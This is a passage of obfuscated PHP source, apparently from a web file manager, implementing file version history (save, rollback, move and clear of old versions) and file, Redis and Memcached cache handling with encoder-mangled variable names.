get_path_ext($ÕóÖ£î‹) : get_path_ext($æ¹ÙŞ); $ñíˆîÜº = KodArchive::extract(self::iconvSystem($æ¹ÙŞ), $ÖÊ„±ã, $¤äøô¶[$š°ƒË«û[1277]], $Å–âÍ, $±Ò·ÕÙÆ); self::unzipErrorCheck($ñíˆîÜº, array($š°ƒË«û[1298], $¸â—«›Î, $ıª¿Úî, $¤äøô¶, $­¶”ı ›)); if (IO::exist($úèùµ)) { IO::rename($úèùµ, get_path_this($­¶”ı ›)); } $æ¹ÙŞ = $­¶”ı ›; } $ÎÕıë´˜ = $æ¹ÙŞ; return array($š°ƒË«û[232] => $æ¹ÙŞ, $š°ƒË«û[1276] => $ıª¿Úî, $š°ƒË«û[1278] => $ÖÊ„±ã); } private static function unzipErrorCheck($ö“ÜëşĞ, $³Ú¸õ’ä = false) { $ô÷ì‹Û­ =& $_SERVER[ÔÕ±ĞšÎ]; if ($ö“ÜëşĞ[$ô÷ì‹Û­[1299]]) { return !0; } write_log(array($ô÷ì‹Û­[1300], $ö“ÜëşĞ, $³Ú¸õ’ä), $ô÷ì‹Û­[1301]); show_json($ô÷ì‹Û­[1302] . json_encode($ö“ÜëşĞ[$ô÷ì‹Û­[1289]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ã‡ï½õ =& $_SERVER[ÔÕ±ĞšÎ]; $ªªàÌºà = $GLOBALS[$ã‡ï½õ[6]][$ã‡ï½õ[92]]; if ($ªªàÌºà[$ã‡ï½õ[1303]] != 1) { return; } if ($ªªàÌºà[$ã‡ï½õ[1304]] <= 0) { return; } if (isset($_REQUEST[$ã‡ï½õ[1305]]) && $_REQUEST[$ã‡ï½õ[1305]] == $ã‡ï½õ[91]) { return; } Hook::bind($ã‡ï½õ[1306], $ã‡ï½õ[1307]); Hook::bind($ã‡ï½õ[1308], $ã‡ï½õ[1309]); Hook::bind($ã‡ï½õ[1310], $ã‡ï½õ[1311]); Hook::bind($ã‡ï½õ[1312], $ã‡ï½õ[1313]); Hook::bind($ã‡ï½õ[1314], $ã‡ï½õ[1315]); Hook::bind($ã‡ï½õ[1316], $ã‡ï½õ[1317]); } public static function eventBeforeUpload($Ëîîô™) { if ($Ëîîô™[3] && $Ëîîô™[3] != REPEAT_REPLACE) { return; } $Æ‚‰Ùî» = self::parsePath($Ëîîô™[0]); if (!$Æ‚‰Ùî») { return; } self::add($Æ‚‰Ùî»); } public static function eventBeforeEdit($–™…ïâ«) { $Í¹ÕœÒ™ = self::parsePath($–™…ïâ«[0]); if (!$Í¹ÕœÒ™) { return; } self::add($Í¹ÕœÒ™); } public static function eventBeforeCopyFile($¶“ìÅı, $©·Èá¯ß, $Šº¶ğ¨, $ç®ØÓ©µ, $ÌÇáŠÖí, $ŸâÇôß°) { $›òÜÄ‚À =& $_SERVER[ÔÕ±ĞšÎ]; if (isset($Šº¶ğ¨->_data[$›òÜÄ‚À[1238]]) && $Šº¶ğ¨->_data[$›òÜÄ‚À[1238]]) { return; } $åÕóàú = $Šº¶ğ¨->getPathOuter($ç®ØÓ©µ); $²‹Ï‚Æ = self::parsePath($åÕóàú); if (!$²‹Ï‚Æ) { return; } self::add($²‹Ï‚Æ); } public static function eventBeforeRename($şèÑä©‰) { $ºª•ÀØÛ =& $_SERVER[ÔÕ±ĞšÎ]; $™Ñ…ÎËÏ = self::parsePath($şèÑä©‰[0]); if (!$™Ñ…ÎËÏ) { return; } $ÊÏú×İ… = self::checkInHistory($™Ñ…ÎËÏ); if (!$ÊÏú×İ…) { return; } if ($ÊÏú×İ…[$ºª•ÀØÛ[33]] == $ºª•ÀØÛ[232]) { $Âã¾Ä·è = self::listData($™Ñ…ÎËÏ); if ($Âã¾Ä·è && $Âã¾Ä·è[$ºª•ÀØÛ[447]]) { self::moveHistory($™Ñ…ÎËÏ, $şèÑä©‰[1]); } } else { IO::rename($ÊÏú×İ…[$ºª•ÀØÛ[87]], $şèÑä©‰[1]); } } public static function eventBeforeMove($¬÷·Ÿì‚) { $åô ç‡— =& $_SERVER[ÔÕ±ĞšÎ]; $¼­°Á…ç = self::parsePath($¬÷·Ÿì‚[0]); if (!$¼­°Á…ç) { return; } $ÛÌÈø„ = self::parsePath($¬÷·Ÿì‚[1]); if (!$ÛÌÈø„) { return; } $ÌÆá½¡ë = $¬÷·Ÿì‚[3]; $÷ª†ĞÚ¢ = self::checkInHistory($¼­°Á…ç); if (!$÷ª†ĞÚ¢) { return; } $ÕƒÑÄ¼€ = self::pathHistory($ÛÌÈø„); if ($÷ª†ĞÚ¢[$åô ç‡—[33]] == $åô ç‡—[232]) { $¾½¸˜Œµ = self::listData($¼­°Á…ç); $şìíÇëú = rtrim($ÛÌÈø„, $åô ç‡—[8]) . $åô ç‡—[8] . ($ÌÆá½¡ë ? $ÌÆá½¡ë : get_path_this($¼­°Á…ç)); $Íƒ÷Ñäº = self::listData($şìíÇëú); if ($¾½¸˜Œµ && $¾½¸˜Œµ[$åô ç‡—[447]] && $Íƒ÷Ñäº && $Íƒ÷Ñäº[$åô ç‡—[447]]) { return self::clear($¼­°Á…ç); } if ($¾½¸˜Œµ && $¾½¸˜Œµ[$åô ç‡—[447]]) { self::moveHistory($¼­°Á…ç, $ÌÆá½¡ë, $ÕƒÑÄ¼€); } } else { IO::move($÷ª†ĞÚ¢[$åô ç‡—[87]], $ÕƒÑÄ¼€, !1, $ÌÆá½¡ë); self::clearEmptyFolder(IO::pathFather($÷ª†ĞÚ¢[$åô ç‡—[87]])); } } public static function eventAfterRemove($â—÷§Ó©, $¹Ô¿Ü­») { $ƒ ¿³¶ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$¹Ô¿Ü­») { return; } $·ŒôëŸÁ = self::parsePath($â—÷§Ó©[0]); if (!$·ŒôëŸÁ) { return; } $¡˜åÆÈè = self::checkInHistory($·ŒôëŸÁ); if (!$¡˜åÆÈè) { return; } if ($¡˜åÆÈè[$ƒ ¿³¶[33]] == $ƒ ¿³¶[232]) { $ƒÑÒ•¶û = self::listData($·ŒôëŸÁ, !1); if ($ƒÑÒ•¶û && $ƒÑÒ•¶û[$ƒ ¿³¶[447]]) { self::clear($·ŒôëŸÁ, !1); } } else { IO::remove($¡˜åÆÈè[$ƒ ¿³¶[87]]); self::clearEmptyFolder(IO::pathFather($¡˜åÆÈè[$ƒ ¿³¶[87]])); } } private static function checkInHistory($ö¬ÓÌ™¡) { $‡¨ÚÙ = self::pathHistory($ö¬ÓÌ™¡); if (!IO::exist($‡¨ÚÙ)) { $‡¨ÚÙ .= $_SERVER[ÔÕ±ĞšÎ][1318]; } return IO::exist($‡¨ÚÙ) ? IO::info($‡¨ÚÙ) : !1; } private static function parsePath($ıÊƒç) { $òÊŠèÅê =& $_SERVER[ÔÕ±ĞšÎ]; if (!$ıÊƒç) { return !1; } if (isset($GLOBALS[$òÊŠèÅê[1319]]) && $GLOBALS[$òÊŠèÅê[1319]]) { return; } $ôÀ° = KodIO::parse($ıÊƒç); $îâÔÜñ = $ôÀ°[$òÊŠèÅê[33]]; $Ä°‘·¦§ = !$îâÔÜñ || $îâÔÜñ == KodIO::KOD_IO || $îâÔÜñ == KodIO::KOD_SHARE_ITEM; if (!$Ä°‘·¦§ || !$ôÀ°[$òÊŠèÅê[1320]]) { return !1; } if (substr($ıÊƒç, 0, strlen(DATA_PATH . $òÊŠèÅê[1321])) == DATA_PATH . $òÊŠèÅê[1321]) { return !1; } if ($îâÔÜñ == KodIO::KOD_SHARE_ITEM) { $Ø†“ÀÑ¶ = IO::init($ıÊƒç); if ($Ø†“ÀÑ¶->pathParse[$òÊŠèÅê[1234]]) { return self::parsePath($Ø†“ÀÑ¶->pathParse[$òÊŠèÅê[1234]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $›ãÉ´ùƒ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $òÊŠèÅê[1322]); foreach ($›ãÉ´ùƒ as $Š¿Ğˆ—¡) { if (!$îâÔÜñ && substr($ıÊƒç, 0, strlen($Š¿Ğˆ—¡)) == $Š¿Ğˆ—¡) { return !1; } } self::log($GLOBALS[$òÊŠèÅê[1229]] . $òÊŠèÅê[1323] . $ıÊƒç); return $ıÊƒç; } private static function pathHistory($üºÜÛÑî) { $ª¿ªİò =& $_SERVER[ÔÕ±ĞšÎ]; $¬ÀÔ·Š = self::$_historyBase . ltrim(KodIO::clear($üºÜÛÑî), $ª¿ªİò[8]); $¬ÀÔ·Š = str_replace(array($ª¿ªİò[1324]), array($ª¿ªİò[1325]), $¬ÀÔ·Š); return $¬ÀÔ·Š; } public static function log($‹òé”Ûì) { } public static function historyCount($¨÷ü´Å™) { $ø±ˆÜÃÎ =& $_SERVER[ÔÕ±ĞšÎ]; $‚Ìé»‘˜ = array(); $ºè‹Ûƒà = array(); foreach ($¨÷ü´Å™ as $¬ÖşªÈ¦) { $äÛ˜¡Ì = get_path_father($¬ÖşªÈ¦); if (!$ºè‹Ûƒà[$äÛ˜¡Ì]) { $ºè‹Ûƒà[$äÛ˜¡Ì] = array(); } $ºè‹Ûƒà[$äÛ˜¡Ì][] = get_path_this($¬ÖşªÈ¦); } foreach ($ºè‹Ûƒà as $äÛ˜¡Ì => $çÈÉÕÕì) { $ê¡ÁÌ²š = self::parsePath($äÛ˜¡Ì); if (!$ê¡ÁÌ²š) { continue; } foreach ($çÈÉÕÕì as $Òµ‡ÌÁ) { $˜ø¯ûæõ = self::listData(rtrim($ê¡ÁÌ²š, $ø±ˆÜÃÎ[8]) . $ø±ˆÜÃÎ[8] . $Òµ‡ÌÁ, !1); if ($˜ø¯ûæõ && $˜ø¯ûæõ[$ø±ˆÜÃÎ[447]]) { $‚Ìé»‘˜[rtrim($äÛ˜¡Ì, $ø±ˆÜÃÎ[8]) . $ø±ˆÜÃÎ[8] . $Òµ‡ÌÁ] = count($˜ø¯ûæõ[$ø±ˆÜÃÎ[447]]); } } } return $‚Ìé»‘˜; } public static function add($ÁÆ§‹á) { $´â¸šÇµ =& $_SERVER[ÔÕ±ĞšÎ]; $öİ²Â”¡ = self::listData($ÁÆ§‹á); if (!$öİ²Â”¡) { return; } $–ûÀ£“« = Model($´â¸šÇµ[844])->get($´â¸šÇµ[1326]); $¯ìÛ¦úÎ = intval($GLOBALS[$´â¸šÇµ[6]][$´â¸šÇµ[92]][$´â¸šÇµ[1304]]); $…ù´¡é = $–ûÀ£“« == $´â¸šÇµ[1327] ? min(5, $¯ìÛ¦úÎ) : $¯ìÛ¦úÎ; if ($¯ìÛ¦úÎ <= 0) { return; } $ôë…€ò = IO::info($ÁÆ§‹á); $ğŒ÷µˆ¿ = $öİ²Â”¡[$´â¸šÇµ[447]]; if ($ôë…€ò[$´â¸šÇµ[79]] == 0) { return; } if ($ôë…€ò[$´â¸šÇµ[79]] >= 1024 * 1024 * 500) { return !1; } $Øèåƒõ› = IO::hashSimple($ÁÆ§‹á); if ($ğŒ÷µˆ¿ && $ğŒ÷µˆ¿[0][$´â¸šÇµ[677]] == $Øèåƒõ›) { return !0; } if (array_key_exists($´â¸šÇµ[235], $ôë…€ò) && !$ôë…€ò[$´â¸šÇµ[235]]) { return !1; } $ÒÎ§î­ï = short_id(time()); $¶êä¸”– = array($´â¸šÇµ[477] => $ÒÎ§î­ï, $´â¸šÇµ[677] => $Øèåƒõ›, $´â¸šÇµ[32] => $ôë…€ò[$´â¸šÇµ[32]] . $´â¸šÇµ[10] . date($´â¸šÇµ[1328]) . rand_string(1), $´â¸šÇµ[79] => $ôë…€ò[$´â¸šÇµ[79]], $´â¸šÇµ[529] => USER_ID, $´â¸šÇµ[233] => time(), $´â¸šÇµ[1329] => $´â¸šÇµ[12]); IO::mkdir($öİ²Â”¡[$´â¸šÇµ[1330]]); $Æà˜“Ÿ = IO::copy($ÁÆ§‹á, $öİ²Â”¡[$´â¸šÇµ[1330]], !1, $¶êä¸”–[$´â¸šÇµ[32]]); if (!$Æà˜“Ÿ) { self::clearEmptyFolder($öİ²Â”¡[$´â¸šÇµ[1330]]); return !1; } array_unshift($ğŒ÷µˆ¿, $¶êä¸”–); if (count($ğŒ÷µˆ¿) > $…ù´¡é) { $—¥ï¼Ù = array_slice($ğŒ÷µˆ¿, $…ù´¡é); foreach ($—¥ï¼Ù as $Ä±µ§ñ×) { IO::remove($öİ²Â”¡[$´â¸šÇµ[1330]] . $Ä±µ§ñ×[$´â¸šÇµ[32]]); } $ğŒ÷µˆ¿ = array_slice($ğŒ÷µˆ¿, 0, $…ù´¡é); } return self::saveData($öİ²Â”¡[$´â¸šÇµ[1331]], $ğŒ÷µˆ¿); } public static function remove($ÇÆ¨Ò—², $–¹Û¿¢‘) { $«‡˜–ª‡ =& $_SERVER[ÔÕ±ĞšÎ]; $‹ÊŸ¡íÍ = self::listData($ÇÆ¨Ò—²); $ÔŒ®üèŸ = array(); if (!$‹ÊŸ¡íÍ) { return !1; } foreach ($‹ÊŸ¡íÍ[$«‡˜–ª‡[447]] as $€Å¼½ËÀ) { if ($€Å¼½ËÀ[$«‡˜–ª‡[477]] == $–¹Û¿¢‘) { IO::remove($‹ÊŸ¡íÍ[$«‡˜–ª‡[1330]] . $€Å¼½ËÀ[$«‡˜–ª‡[32]]); continue; } $ÔŒ®üèŸ[] = $€Å¼½ËÀ; } return self::saveData($‹ÊŸ¡íÍ[$«‡˜–ª‡[1331]], $ÔŒ®üèŸ); } public static function clear($öº”ç©¯, $Øë‘ô…Â = true) { $“Òçß•ü =& $_SERVER[ÔÕ±ĞšÎ]; $äİéŒ­ª = self::listData($öº”ç©¯, $Øë‘ô…Â); if (!$äİéŒ­ª) { return !1; } foreach ($äİéŒ­ª[$“Òçß•ü[447]] as $ÀÙ´Ü‘Ğ) { IO::remove($äİéŒ­ª[$“Òçß•ü[1330]] . $ÀÙ´Ü‘Ğ[$“Òçß•ü[32]]); } return self::saveData($äİéŒ­ª[$“Òçß•ü[1331]], array()); } public static function moveHistory($Ú¿ûªÛº, $ËùãŞ® = '', $£ ¶¡Ø· = '') { $õå¥Êû× =& $_SERVER[ÔÕ±ĞšÎ]; $®ÒÔ°Ş = self::listData($Ú¿ûªÛº, !1); if (!$®ÒÔ°Ş || !$®ÒÔ°Ş[$õå¥Êû×[447]]) { return !1; } $ş¼÷°Å° = $õå¥Êû×[1318]; $ËùãŞ® = $ËùãŞ® ? $ËùãŞ® : get_path_this($Ú¿ûªÛº); $£ ¶¡Ø· = $£ ¶¡Ø· ? $£ ¶¡Ø· : $®ÒÔ°Ş[$õå¥Êû×[1330]]; $²‡à±˜€ = substr(get_path_this($®ÒÔ°Ş[$õå¥Êû×[1331]]), 0, -strlen($ş¼÷°Å°)); foreach ($®ÒÔ°Ş[$õå¥Êû×[447]] as $á×·ø => $™šÚŞÓ) { $â»ãĞ¦ = $ËùãŞ® . substr($™šÚŞÓ[$õå¥Êû×[32]], strlen($²‡à±˜€)); $†¿²º¼ = IO::move($®ÒÔ°Ş[$õå¥Êû×[1330]] . $™šÚŞÓ[$õå¥Êû×[32]], $£ ¶¡Ø·, !1, $â»ãĞ¦); if ($†¿²º¼) { $®ÒÔ°Ş[$õå¥Êû×[447]][$á×·ø][$õå¥Êû×[32]] = $â»ãĞ¦; } } $®ÒÔ°Ş[$õå¥Êû×[1331]] = IO::move($®ÒÔ°Ş[$õå¥Êû×[1331]], $£ ¶¡Ø·, !1, $ËùãŞ® . $ş¼÷°Å°); self::saveData($®ÒÔ°Ş[$õå¥Êû×[1331]], $®ÒÔ°Ş[$õå¥Êû×[447]]); self::clearEmptyFolder($®ÒÔ°Ş[$õå¥Êû×[1330]]); } public static function rollback($º¦ûÔèÖ, $â±¨Õ›¸) { $¹°š…° =& $_SERVER[ÔÕ±ĞšÎ]; $µ¾ŠØ§ = self::listData($º¦ûÔèÖ); if (!$µ¾ŠØ§) { return; } $‘²Ä™¶ô = IO::info($º¦ûÔèÖ); foreach ($µ¾ŠØ§[$¹°š…°[447]] as $¸¡Ê±” => $»°È‹Œ) { if ($»°È‹Œ[$¹°š…°[477]] == $â±¨Õ›¸) { self::add($º¦ûÔèÖ); $¿Öäá¸† = $µ¾ŠØ§[$¹°š…°[1330]] . $»°È‹Œ[$¹°š…°[32]]; $˜°äÊÎ” = IO::copy($¿Öäá¸†, IO::pathFather($º¦ûÔèÖ), REPEAT_REPLACE, $‘²Ä™¶ô[$¹°š…°[32]]); if ($˜°äÊÎ”) { self::remove($º¦ûÔèÖ, $â±¨Õ›¸); } return $˜°äÊÎ”; } } return !1; } public static function setDetail($…ì¦¼À, $“¸ëä›İ, $›Éü€Ï¸) { $Ûµ¯Ø²ˆ =& $_SERVER[ÔÕ±ĞšÎ]; $¦¢Ÿ©âš = self::listData($…ì¦¼À); if (!$¦¢Ÿ©âš) { return; } foreach ($¦¢Ÿ©âš[$Ûµ¯Ø²ˆ[447]] as $°ıÈÆË => $ÑşÕ“Óœ) { if ($ÑşÕ“Óœ[$Ûµ¯Ø²ˆ[477]] == $“¸ëä›İ) { $¦¢Ÿ©âš[$Ûµ¯Ø²ˆ[447]][$°ıÈÆË][$Ûµ¯Ø²ˆ[1329]] = $›Éü€Ï¸; self::saveData($¦¢Ÿ©âš[$Ûµ¯Ø²ˆ[1331]], $¦¢Ÿ©âš[$Ûµ¯Ø²ˆ[447]]); return !0; } } return !1; } public static function fileInfo($ìñùƒ‡, $²¯ÁÈ) { $‡–Í°ƒœ =& $_SERVER[ÔÕ±ĞšÎ]; $«æ¼¯Áœ = self::listData($ìñùƒ‡); if (!$«æ¼¯Áœ) { show_json(LNG($‡–Í°ƒœ[108]), !1); } $ÒôÈ™ = $‡–Í°ƒœ[12]; foreach ($«æ¼¯Áœ[$‡–Í°ƒœ[447]] as $ºì…¡¯Ø => $Çäˆãòë) { if ($Çäˆãòë[$‡–Í°ƒœ[477]] != $²¯ÁÈ) { continue; } $ÒôÈ™ = $«æ¼¯Áœ[$‡–Í°ƒœ[1330]] . $Çäˆãòë[$‡–Í°ƒœ[32]]; break; } if (!$ÒôÈ™) { show_json(LNG($‡–Í°ƒœ[108]), !1); } return IO::info($ÒôÈ™); } public static function fileOut($‰ñ‡‘†´, $ò³ÃÔª¦, $õ•ø†± = false) { $€£éÌ© =& $_SERVER[ÔÕ±ĞšÎ]; $ÓªşÆÀœ = self::fileInfo($‰ñ‡‘†´, $ò³ÃÔª¦); $®ÒŸôìî =& $GLOBALS[$€£éÌ©[7]]; $õ•ø†± = isset($®ÒŸôìî[$€£éÌ©[1281]]) && $®ÒŸôìî[$€£éÌ©[1281]] == 1; if (isset($®ÒŸôìî[$€£éÌ©[33]]) && $®ÒŸôìî[$€£éÌ©[33]] == $€£éÌ©[1332]) { return IO::fileOutImage($ÓªşÆÀœ[$€£éÌ©[87]], $®ÒŸôìî[$€£éÌ©[1333]]); } IO::fileOut($ÓªşÆÀœ[$€£éÌ©[87]], $õ•ø†±, get_path_this($‰ñ‡‘†´)); } public static function listData($šé€°Ï§, $ûèíøïõ = true) { $—ï“¯÷— =& $_SERVER[ÔÕ±ĞšÎ]; if ($ûèíøïõ && !IO::exist($šé€°Ï§)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($šé€°Ï§, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ª¦­† = self::pathHistory($šé€°Ï§); $ÂöÀ¥ôŸ = array($—ï“¯÷—[1331] => $ª¦­† . $—ï“¯÷—[1318], $—ï“¯÷—[1330] => rtrim(get_path_father($ª¦­†), $—ï“¯÷—[8]) . $—ï“¯÷—[8], $—ï“¯÷—[447] => array()); $ºÇùË™š = IO::getContent($ÂöÀ¥ôŸ[$—ï“¯÷—[1331]]); if ($ºÇùË™š) { $ûãî§å¦ = json_decode($ºÇùË™š, !0); if (is_array($ûãî§å¦)) { $ÂöÀ¥ôŸ[$—ï“¯÷—[447]] = $ûãî§å¦; } } return $ÂöÀ¥ôŸ; } private static function saveData($ó˜ûñŒ¼, $¨½Ê£ÛÎ) { $˜ã©Šâ» =& $_SERVER[ÔÕ±ĞšÎ]; self::log($˜ã©Šâ»[1334] . $ó˜ûñŒ¼ . $˜ã©Šâ»[74] . count($¨½Ê£ÛÎ), $˜ã©Šâ»[826]); if ($¨½Ê£ÛÎ) { return IO::setContent($ó˜ûñŒ¼, json_encode($¨½Ê£ÛÎ)); } $–Ã•„íÚ = IO::pathFather($ó˜ûñŒ¼); IO::remove($ó˜ûñŒ¼); self::clearEmptyFolder($–Ã•„íÚ); return !0; } public static function clearEmptyFolder($ñÒñ¨È‚) { $üÑÊ² =& $_SERVER[ÔÕ±ĞšÎ]; if (trim($ñÒñ¨È‚, $üÑÊ²[8]) == trim(self::$_historyBase, $üÑÊ²[8])) { return; } $š¬ŠÈÅ® = IO::pathFather($ñÒñ¨È‚); $ë¤‡¸Àô = IO::has($ñÒñ¨È‚, !0); if ($ë¤‡¸Àô[$üÑÊ²[241]] > 0 || $ë¤‡¸Àô[$üÑÊ²[242]] > 0) { return; } IO::remove($ñÒñ¨È‚); self::clearEmptyFolder($š¬ŠÈÅ®); } private static function getBasePath() { $Ò¦—êû =& $_SERVER[ÔÕ±ĞšÎ]; $¹Ÿî‚¥ = Model($Ò¦—êû[1335])->get($Ò¦—êû[1336]); if ($¹Ÿî‚¥) { if (!IO::exist($¹Ÿî‚¥)) { IO::mkdir($¹Ÿî‚¥); } if (get_path_this($¹Ÿî‚¥) == $Ò¦—êû[1321]) { $‹ú¡€¯± = $Ò¦—êû[1337] . rand_string(8); @rename($¹Ÿî‚¥, get_path_father($¹Ÿî‚¥) . $Ò¦—êû[8] . $‹ú¡€¯±); $¹Ÿî‚¥ = DATA_PATH . $‹ú¡€¯± . $Ò¦—êû[8]; file_put_contents(DATA_PATH . $Ò¦—êû[1268], $Ò¦—êû[12]); Model($Ò¦—êû[1335])->set($Ò¦—êû[1336], $¹Ÿî‚¥); } return $¹Ÿî‚¥; } $¹Ÿî‚¥ = DATA_PATH . $Ò¦—êû[1337] . rand_string(8) . $Ò¦—êû[8]; $¹Ÿî‚¥ = IO::mkdir($¹Ÿî‚¥); $¹Ÿî‚¥ = rtrim($¹Ÿî‚¥, $Ò¦—êû[8]) . $Ò¦—êû[8]; file_put_contents($¹Ÿî‚¥ . $Ò¦—êû[1268], $Ò¦—êû[12]); file_put_contents(DATA_PATH . $Ò¦—êû[1268], $Ò¦—êû[12]); Model($Ò¦—êû[1335])->set($Ò¦—êû[1336], $¹Ÿî‚¥); return $¹Ÿî‚¥; } } goto A¬ ¤äÀ¨Ê; dØÁ’©Ä: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $›±‰å‚Ÿ =& $_SERVER[ÔÕ±ĞšÎ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $üÖîÕ = $GLOBALS[$›±‰å‚Ÿ[6]][$›±‰å‚Ÿ[426]]; $äŠÖö„÷ = $üÖîÕ[$üÖîÕ[$›±‰å‚Ÿ[901]]]; $¿­Œ§›Á = $üÖîÕ[$›±‰å‚Ÿ[902]]; switch ($üÖîÕ[$›±‰å‚Ÿ[901]]) { case $›±‰å‚Ÿ[21]: self::$handle = Model($›±‰å‚Ÿ[903]); break; case $›±‰å‚Ÿ[904]: self::$handle = new CacheRedis($äŠÖö„÷, $¿­Œ§›Á); break; case $›±‰å‚Ÿ[905]: self::$handle = new CacheMemcached($äŠÖö„÷, $¿­Œ§›Á); break; case $›±‰å‚Ÿ[232]: self::$handle = new CacheFile($äŠÖö„÷, $¿­Œ§›Á); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($½¢ŞÜÇ´) { if (is_array($½¢ŞÜÇ´) || is_object($½¢ŞÜÇ´)) { $½¢ŞÜÇ´ = json_encode($½¢ŞÜÇ´); } $½¢ŞÜÇ´ = rawurlencode($½¢ŞÜÇ´); return md5(KOD_SITE_ID . $_SERVER[ÔÕ±ĞšÎ][11] . $½¢ŞÜÇ´); } public static function get($Ñğ¾ù“œ, $ÎŞÑ­ÅÇ = false) { $•íÃ°ş” = self::key($Ñğ¾ù“œ); $¤Ë’ğ†ò = self::init(); if ($ÎŞÑ­ÅÇ) { return unserialize($¤Ë’ğ†ò->get($•íÃ°ş”)); } if (!isset(self::$memoryCache[$•íÃ°ş”])) { $âˆ¨éğ = $¤Ë’ğ†ò->get($•íÃ°ş”); self::$memoryCache[$•íÃ°ş”] = unserialize($âˆ¨éğ); } return self::$memoryCache[$•íÃ°ş”]; } public static function set($ëÛË˜ì¤, $¯›ù’šï, $Ÿï¤Ï±ú = false) { $ŞŠçäöß =& $_SERVER[ÔÕ±ĞšÎ]; $ ¸…íÛú = self::key($ëÛË˜ì¤); if (isset(self::$memoryCache[$ ¸…íÛú]) && self::$memoryCache[$ ¸…íÛú] === $¯›ù’šï) { return !0; } if ($Ÿï¤Ï±ú === 0) { self::$memoryCache[$ ¸…íÛú] = $¯›ù’šï; return !0; } $£›ù§Ä‘ = self::init(); $Ìú¥ƒíÃ = serialize($¯›ù’šï); CacheLock::lock($ëÛË˜ì¤ . $ŞŠçäöß[906]); $ÊùƒÎ„ = $£›ù§Ä‘->set($ ¸…íÛú, $Ìú¥ƒíÃ, $Ÿï¤Ï±ú); self::$memoryCache[$ ¸…íÛú] = $¯›ù’šï; CacheLock::unlock($ëÛË˜ì¤ . $ŞŠçäöß[906]); return $ÊùƒÎ„; } public static function getCall($´¤†®…™, $É¬Ëı®ï, $ŠÃ‹‘ÔÊ, $óÜ›×Ï = array()) { $¶œ±Œ³ =& $_SERVER[ÔÕ±ĞšÎ]; $ÂíÚÛ“İ = self::get($´¤†®…™); if ($ÂíÚÛ“İ || $ÂíÚÛ“İ === $¶œ±Œ³[12]) { return $ÂíÚÛ“İ; } $ÂíÚÛ“İ = call_user_func_array($ŠÃ‹‘ÔÊ, $óÜ›×Ï); $ÂíÚÛ“İ = $ÂíÚÛ“İ ? $ÂíÚÛ“İ : $¶œ±Œ³[12]; self::set($´¤†®…™, $ÂíÚÛ“İ, $É¬Ëı®ï); return $ÂíÚÛ“İ; } public static function remove($ğ™¥âÈè) { $é¢¨ö• = self::key($ğ™¥âÈè); unset(self::$memoryCache[$é¢¨ö•]); self::clearTimeout(); CacheLock::lock($ğ™¥âÈè); $§£ÅœËÛ = self::init()->remove($é¢¨ö•); CacheLock::unlock($ğ™¥âÈè); return $§£ÅœËÛ; } public static function removeMemory($õ£ÌªĞÙ) { $ú â¦õó = self::key($õ£ÌªĞÙ); unset(self::$memoryCache[$ú â¦õó]); } public static function clearMemory($€‘Ğ“¼× = false) { if ($€‘Ğ“¼×) { $€‘Ğ“¼× = self::key($€‘Ğ“¼×); unset(self::$memoryCache[$€‘Ğ“¼×]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ÔÕ±ĞšÎ][907])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ÔÕ±ĞšÎ][908])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Ø”³Û·Ğ, $µïÔ—å) { $÷æƒÉ•Ú =& $_SERVER[ÔÕ±ĞšÎ]; $this->cachePath = $Ø”³Û·Ğ[$÷æƒÉ•Ú[87]]; $this->prefix = $÷æƒÉ•Ú[909]; $this->cacheTime = $µïÔ—å; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($¶ƒÓÊøÏ) { $œ¼ÜÂû =& $_SERVER[ÔÕ±ĞšÎ]; $¶ƒÓÊøÏ = str_replace(array($œ¼ÜÂû[910], $œ¼ÜÂû[100], $œ¼ÜÂû[76]), $œ¼ÜÂû[911], $¶ƒÓÊøÏ); return $this->cachePath . $œ¼ÜÂû[912] . $¶ƒÓÊøÏ . $œ¼ÜÂû[913]; } public function set($¨—³ñíà, $¬»óùÏ, $ëå’¥¯¦ = false) { $ëå’¥¯¦ = $ëå’¥¯¦ ? $ëå’¥¯¦ : $this->cacheTime; $Ãù¬š× = $this->getFile($¨—³ñíà); if (file_put_contents($Ãù¬š×, $this->prefix . $¬»óùÏ, LOCK_EX)) { @touch($Ãù¬š×, intval(time() + $ëå’¥¯¦)); clearstatcache(); return !0; } @unlink($Ãù¬š×); return !1; } public function get($±‹æ€””) { $î™ëáÏ = $this->getFile($±‹æ€””); if (file_exists($î™ëáÏ) && filemtime($î™ëáÏ) < time()) { @unlink($î™ëáÏ); return !1; } $“¼ê‡ŠŸ = @file_get_contents($î™ëáÏ); return substr($“¼ê‡ŠŸ, strlen($this->prefix)); } public function remove($ì¶Á®Ù) { $“¢¤¿ = $this->getFile($ì¶Á®Ù); return @unlink($“¢¤¿); } public function deleteAll() { $˜¡–îú =& $_SERVER[ÔÕ±ĞšÎ]; $õıÜâŒ = scandir($this->cachePath); foreach ($õıÜâŒ as $´ú†à”Æ) { $’Ÿ¦Š‹ = $this->cachePath . $´ú†à”Æ; if (strpos($’Ÿ¦Š‹, $˜¡–îú[913]) && strpos($’Ÿ¦Š‹, $˜¡–îú[914])) { @unlink($’Ÿ¦Š‹); } } } public function clearTimeout() { $ğ°–Ğì¾ =& $_SERVER[ÔÕ±ĞšÎ]; $“Üæ— = scandir($this->cachePath); foreach ($“Üæ— as $àÆÎÔ§³) { $¤şöı¿ = $this->cachePath . $àÆÎÔ§³; if (strpos($¤şöı¿, $ğ°–Ğì¾[913]) && strpos($¤şöı¿, $ğ°–Ğì¾[914]) && filemtime($¤şöı¿) < time()) { @unlink($¤şöı¿); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function 